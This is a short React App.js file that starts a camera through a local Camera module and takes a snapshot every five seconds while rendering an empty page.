import logo from './logo.svg';
import './App.css';
import camera from './Camera';
import React, { useState, useEffect } from "react";

function App() {
const [sent,setsent]=useState(true);

  camera.startCamera();


  useEffect(() => {
    const intervalId = setInterval(() => {
      camera.takeSnapshot(); setsent(true);
    }, 5000);
  
    return () => clearInterval(intervalId);
  }, []);

  return (
    <div className="App">
      
    </div>
  );
}

export default App;
